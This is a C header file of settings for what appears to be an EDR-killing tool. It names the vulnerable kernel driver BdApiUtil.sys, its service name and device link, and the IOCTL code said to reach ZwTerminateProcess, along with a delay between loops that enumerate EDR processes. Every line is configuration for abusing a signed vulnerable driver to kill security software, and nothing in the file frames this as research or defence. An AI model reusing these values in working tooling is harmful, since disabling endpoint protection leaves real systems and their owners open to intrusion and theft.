/*
		Store all variables and settings used across the project
*/

#pragma once

// Define path for the driver file
#define g_VULNDRIVERPATH		L"\\System32\\Drivers\\"		// Variable for the driver path which is the default directory for runtime-loaded kernel drivers

// Define variables for the vulnerable driver
#define g_VULNDRIVERNAME		L"BdApiUtil"					// Service name to be registered
#define g_VULNDRIVERFILENAME	L"BdApiUtil.sys"				// Name of the driver file written to disk
#define g_VULNDRIVERSYMLINK		L"\\\\.\\BdApiUtil"				// Symbolic link of the vulnerable driver

// Define IOCTL code
#define IOCTL_CODE				0x800024B4						// Vulnerable IOCTL code for the ZwTerminateProcess call

// Define the sleep time
#define g_SLEEPTIME				1000							// Time to sleep inbetween EDR process enumerations loops